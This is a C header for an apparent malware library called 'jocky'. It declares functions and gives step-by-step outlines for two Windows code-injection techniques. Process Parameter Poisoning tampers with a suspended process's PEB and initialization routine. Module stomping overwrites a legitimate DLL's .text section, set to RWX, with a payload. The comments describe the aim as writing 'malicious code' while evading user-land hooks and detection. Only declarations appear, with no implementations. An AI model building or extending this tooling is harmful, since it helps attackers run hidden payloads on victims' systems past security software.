#ifndef JOCKY_PROCESS_INJECTION_H
#define JOCKY_PROCESS_INJECTION_H

#include <windows.h>
#include <stdint.h>

/* Advanced Process Injection Techniques
 *
 * Modern alternatives to CreateRemoteThread that evade user-land hooks:
 *
 * 1. P3 (Process Parameter Poisoning)
 *    - Override PEB to inject into initial parameters
 *    - Executed before legitimate process startup
 *    - Bypasses most user-land hooks
 *
 * 2. Module Stomping
 *    - Load legitimate DLL (e.g., ntdll.dll, kernel32.dll)
 *    - Overwrite .text section with malicious code
 *    - Preserves legitimate import tables and metadata
 *    - Evades module-based detection
 */

typedef struct {
    HANDLE process;
    HANDLE thread;
    uint32_t pid;
    void* injection_addr;
} INJECTION_CONTEXT;

/* Process Parameter Poisoning (P3)
 *
 * Technique:
 * 1. Create process suspended
 * 2. Read PEB from target process
 * 3. Modify RTL_USER_PROCESS_PARAMETERS (command line, environment)
 * 4. Write malicious code to InitializationRoutine
 * 5. Resume process
 */

int jocky_p3_inject(
    const char* target_exe,
    const char* fake_cmdline,
    const uint8_t* payload,
    int payload_size,
    INJECTION_CONTEXT* out_ctx
);

int jocky_p3_poison_environment(
    HANDLE process,
    void* peb_address,
    const char* new_env_var
);

int jocky_p3_poison_command_line(
    HANDLE process,
    void* peb_address,
    const char* new_cmdline
);

int jocky_p3_write_initialization_routine(
    HANDLE process,
    void* peb_address,
    const uint8_t* code,
    int code_size
);

/* Module Stomping
 *
 * Technique:
 * 1. Load legitimate DLL into process
 * 2. Find .text section in loaded module
 * 3. Change page protection to RWX
 * 4. Overwrite .text with malicious code
 * 5. Module metadata/imports remain legitimate
 * 6. Call through module's export table (if applicable)
 */

typedef struct {
    char module_name[256];
    void* base_address;
    void* text_section;
    int text_size;
} MODULE_STOMP_CONTEXT;

int jocky_module_stomp_prepare(
    HANDLE process,
    const char* legitimate_dll,
    MODULE_STOMP_CONTEXT* out_ctx
);

int jocky_module_stomp_inject(
    HANDLE process,
    MODULE_STOMP_CONTEXT* stomp_ctx,
    const uint8_t* payload,
    int payload_size
);

int jocky_module_stomp_call_export(
    HANDLE process,
    MODULE_STOMP_CONTEXT* stomp_ctx,
    const char* export_name,
    void* args
);

int jocky_module_stomp_restore(
    HANDLE process,
    MODULE_STOMP_CONTEXT* stomp_ctx
);

/* Utilities */

int jocky_find_module_section(
    HANDLE process,
    void* module_base,
    const char* section_name,
    void** out_addr,
    int* out_size
);

int jocky_change_process_protection(
    HANDLE process,
    void* address,
    int size,
    uint32_t new_protect
);

int jocky_execute_in_process(
    HANDLE process,
    const uint8_t* code,
    int code_size,
    uint64_t* out_result
);

#endif
